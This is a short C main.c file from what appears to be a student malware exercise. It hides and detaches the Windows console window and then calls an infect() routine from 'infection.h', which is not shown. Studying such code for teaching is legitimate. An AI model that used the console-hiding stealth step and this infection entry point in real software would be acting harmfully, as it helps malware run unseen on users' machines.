/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jguyet <jguyet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2017/03/13 12:11:43 by jguyet            #+#    #+#             */
/*   Updated: 2017/03/13 12:15:42 by jguyet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "infection.h"
/*
**	Hide and close the current terminal
*/
void				close_console()
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_MINIMIZE);
	ShowWindow(hWnd, SW_HIDE);
	FreeConsole();
}

/*
**	Start a new console and relink file descriptor 0, 1, 2
**	then resizing window 300x600 to position x(100) y(100) and disabling resizing
*/
void				start_debug_console()
{
	AllocConsole();
	freopen("CONIN$", "r", stdin);
	freopen("CONOUT$", "w", stdout);
	freopen("CONOUT$", "w", stderr);
	HWND hWnd = GetConsoleWindow();
	if (hWnd) {
		SetWindowPos(hWnd, 0, 100, 100, 600, 600, NO_FLAGS);
		SetWindowLong(hWnd, GWL_STYLE, GetWindowLong(hWnd, GWL_STYLE) &~ WS_SIZEBOX);
	}
}

/*
** Just in case a SEGV is knocking...
*/
void signal_handler(int signal)
{
	printf("Something went wrong, i'm dying... good bye\n");
	exit (1);
}

/*
**	Main entry point
*/
int					main(int argc, char **argv)
{
	setlocale(LC_CTYPE, "");
	signal(SIGSEGV, signal_handler);
	infect();
	return (0);
}
